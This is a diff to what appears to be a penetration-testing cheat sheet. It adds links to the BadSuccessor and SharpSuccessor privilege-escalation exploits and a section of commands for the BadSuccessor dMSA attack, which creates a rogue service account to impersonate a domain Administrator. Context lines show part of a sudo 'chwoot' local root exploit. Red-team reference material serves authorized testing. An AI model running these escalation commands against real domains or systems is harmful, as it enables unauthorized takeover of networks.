@@ -455,6 +455,7 @@ Thank you for reading.
 | CVE-2025-30397 | Windows Server 2025 Use-After-Free in JScript.dll (RCE) | https://github.com/mbanyamer/CVE-2025-30397---Windows-Server-2025-JScript-RCE-Use-After-Free- |
 | CVE-2025-32463 | chwoot sudo LPE | https://github.com/pr0v3rbs/CVE-2025-32463_chwoot |
 | CVE-2025-9074 | Docker Desktop (Windows) Container Escape - Host Write via Exposed Engine API | https://github.com/zenzue/CVE-2025-9074 |
+| n/a | BadSuccessor LPE | https://github.com/ibaiC/BadSuccessor |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
@@ -478,6 +479,7 @@ Thank you for reading.
 | n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
 | n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
 | n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
+| n/a | SharpSuccessor LPE | https://github.com/logangoins/SharpSuccessor |
 | n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
 | n/a | SystemNightmare PE | https://github.com/GossiTheDog/SystemNightmare |
 | n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
@@ -8932,6 +8934,30 @@ gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
 echo "woot!"
 sudo -R woot woot
 rm -rf ${STAGE?}
+```
+
+## BadSuccessor Delegated Managed Service Account (dMSA) LPE
+
+> https://github.com/ibaiC/BadSuccessor
+
+```cmd
+PS C:\> .\BadSuccessor.exe find
+```
+
+```cmd
+PS C:\> .\BadSuccessor.exe escalate -targetOU "OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>" -dmsa evildmsa -targetUser "CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>" -dnshostname evildmsa -user <USERNAME> -dc-ip <RHOST>
+```
+
+```shell
+$ impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
+```
+
+```shell
+$ export KRB5CCNAME=<FILE>.ccache
+```
+
+```shell
+$ python3 getST.py <DOMAIN>/<USERNAME> -dc-ip <RHOST> -self -dmsa -impersonate evildmsa$ -k -no-pass
 ```
 
 #### GodPotato LPE
